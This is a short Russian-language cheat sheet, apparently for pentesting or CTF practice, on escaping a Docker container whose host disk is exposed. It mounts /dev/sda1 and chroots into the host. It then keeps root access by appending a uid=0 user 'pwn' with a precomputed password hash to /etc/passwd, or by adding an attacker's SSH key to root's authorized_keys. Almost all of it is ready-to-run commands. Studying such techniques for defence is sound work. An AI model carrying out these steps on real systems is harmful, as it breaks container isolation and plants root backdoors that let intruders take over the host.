# Docker escape

## mount /dev/sda1

Если мы ```root```, и у нас примонтирована хостовая ОС:

```
ls -la /dev/sda*
```

Если видим ```/dev/sda1``` можем смело покидать контейнер:

```
mkdir /mnt/host
```

```
mount /dev/sda1 /mnt/host
```

```
ls -la /mnt/host/root
```

```
ls -la /mnt/host/etc
```

Видим файловую систему хоста, делаем:

```
chroot /mnt/host /bin/bash
```

Далее можем создать нового пользователя с uid=0 или подложить публичный SSH ключ руту [Привилегированный доступ](#привилегированный-доступ)

# Привилегированный доступ

## Создание нового пользователя:

Высчитываем хэш пароля:

```
openssl passwd -1 password
```

Записываем пользователя с uid=0 и с полученным хэшем в ```/etc/passwd```:

```
echo 'pwn:$1$FG0zmfaF$rgrSx5Qia8TGQXWgW70x90:0:0:pwn:/root:/bin/sh' >> /etc/passwd
```

## Публичный ключ для root

На своем хосте создаем пару ключей:

```
ssh-keygen -t ed25519 -f ~/.ssh/root_key
```

Получаем два файла: ```root_key``` и ```root_key.pub```. Содержимое ```root_key.pub``` добавляем в ```/root/.ssh/authorized_keys``` на уязвимом хосте:

```
echo "содержимое из root_key.pub" >> /root/.ssh/authorized_keys
```

Далее подключаемся по SSH с ключом:

```
ssh root@192.168.0.100 -i ~/.ssh/root_key
```
